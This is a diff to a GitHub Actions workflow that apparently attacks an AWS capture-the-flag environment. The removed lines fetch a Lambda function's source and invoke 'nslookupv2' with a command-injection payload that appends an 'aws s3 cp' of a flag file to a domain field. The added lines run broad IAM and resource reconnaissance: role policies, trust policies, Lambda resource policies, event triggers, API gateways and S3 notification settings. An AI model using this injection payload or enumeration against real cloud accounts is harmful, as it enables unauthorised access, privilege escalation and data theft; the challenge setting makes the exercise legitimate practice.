@@ -20,49 +20,98 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      - name: Describe VPC
+      - name: cicdRole - attached managed policies
+        continue-on-error: true
         run: |
-          echo "===== VPC ====="
-          aws ec2 describe-vpcs --vpc-ids vpc-09328d3fa21dce320
+          echo "===== cicdRole ATTACHED POLICIES ====="
+          aws iam list-attached-role-policies --role-name cicdRole
 
-      - name: Get Lambda code location and download source
+      - name: cicdRole - inline policies
+        continue-on-error: true
         run: |
-          echo "===== LAMBDA CODE LOCATION ====="
-          URL=$(aws lambda get-function --function-name nslookupv2 --query 'Code.Location' --output text)
-          echo "$URL"
-          curl -sL "$URL" -o code.zip
+          echo "===== cicdRole INLINE POLICY NAMES ====="
+          aws iam list-role-policies --role-name cicdRole
+          for POLICY in $(aws iam list-role-policies --role-name cicdRole --query 'PolicyNames[]' --output text); do
+            echo "----- $POLICY -----"
+            aws iam get-role-policy --role-name cicdRole --policy-name "$POLICY"
+          done
 
-      - name: Unzip and show handler
+      - name: cicdRole - trust policy
+        continue-on-error: true
         run: |
-          mkdir -p extracted
-          unzip -o code.zip -d extracted
-          echo "===== FILES ====="
-          find extracted -type f
-          echo "===== lambda_function.py ====="
-          cat extracted/lambda_function.py || true
+          echo "===== cicdRole TRUST POLICY ====="
+          aws iam get-role --role-name cicdRole --query 'Role.AssumeRolePolicyDocument'
 
-      - name: Invoke nslookupv2 with injected payload
+      - name: CTFExecutionRole - trust policy (who can assume it)
+        continue-on-error: true
         run: |
-          aws lambda invoke \
-            --function-name nslookupv2 \
-            --payload '{"domain":"example.com; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && cat /tmp/flag.txt"}' \
-            --cli-binary-format raw-in-base64-out \
-            response.json
-          echo "===== INVOKE RESPONSE ====="
-          cat response.json
+          echo "===== CTFExecutionRole TRUST POLICY ====="
+          aws iam get-role --role-name CTFExecutionRole --query 'Role.AssumeRolePolicyDocument'
 
-      - name: Wait for logs to propagate
-        run: sleep 8
-
-      - name: Fetch CloudWatch logs
+      - name: CTFExecutionRole - attached and inline policies
+        continue-on-error: true
         run: |
-          STREAM=$(aws logs describe-log-streams \
-            --log-group-name /aws/lambda/nslookupv2 \
-            --order-by LastEventTime --descending --limit 1 \
-            --query 'logStreams[0].logStreamName' --output text)
-          echo "===== LOG STREAM: $STREAM ====="
-          aws logs get-log-events \
-            --log-group-name /aws/lambda/nslookupv2 \
-            --log-stream-name "$STREAM" \
-            --query 'events[*].message' \
-            --output text
+          echo "===== CTFExecutionRole ATTACHED POLICIES ====="
+          aws iam list-attached-role-policies --role-name CTFExecutionRole
+          echo "===== CTFExecutionRole INLINE POLICIES ====="
+          aws iam list-role-policies --role-name CTFExecutionRole
+          for POLICY in $(aws iam list-role-policies --role-name CTFExecutionRole --query 'PolicyNames[]' --output text); do
+            echo "----- $POLICY -----"
+            aws iam get-role-policy --role-name CTFExecutionRole --policy-name "$POLICY"
+          done
+
+      - name: lambdaRole - trust policy and policies
+        continue-on-error: true
+        run: |
+          echo "===== lambdaRole TRUST POLICY ====="
+          aws iam get-role --role-name lambdaRole --query 'Role.AssumeRolePolicyDocument'
+          echo "===== lambdaRole ATTACHED POLICIES ====="
+          aws iam list-attached-role-policies --role-name lambdaRole
+          echo "===== lambdaRole INLINE POLICIES ====="
+          aws iam list-role-policies --role-name lambdaRole
+
+      - name: Check for Lambda Function URL
+        continue-on-error: true
+        run: |
+          echo "===== FUNCTION URL CONFIG ====="
+          aws lambda get-function-url-config --function-name nslookupv2
+
+      - name: Check resource-based policy on the Lambda itself
+        continue-on-error: true
+        run: |
+          echo "===== LAMBDA RESOURCE POLICY ====="
+          aws lambda get-policy --function-name nslookupv2
+
+      - name: Check event source mappings
+        continue-on-error: true
+        run: |
+          echo "===== EVENT SOURCE MAPPINGS ====="
+          aws lambda list-event-source-mappings --function-name nslookupv2
+
+      - name: Check EventBridge rules targeting this Lambda
+        continue-on-error: true
+        run: |
+          echo "===== EVENTBRIDGE RULES TARGETING nslookupv2 ====="
+          aws events list-rule-names-by-target \
+            --target-arn arn:aws:lambda:us-east-1:009661764077:function:nslookupv2
+
+      - name: Check API Gateway REST APIs
+        continue-on-error: true
+        run: |
+          echo "===== API GATEWAY (REST) ====="
+          aws apigateway get-rest-apis
+
+      - name: Check API Gateway HTTP APIs (v2)
+        continue-on-error: true
+        run: |
+          echo "===== API GATEWAY (HTTP/v2) ====="
+          aws apigatewayv2 get-apis
+
+      - name: Check S3 bucket notification configs (possible S3-triggered invocation)
+        continue-on-error: true
+        run: |
+          echo "===== S3 BUCKET NOTIFICATION CONFIG ====="
+          for BUCKET in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
+            echo "----- $BUCKET -----"
+            aws s3api get-bucket-notification-configuration --bucket "$BUCKET"
+          done
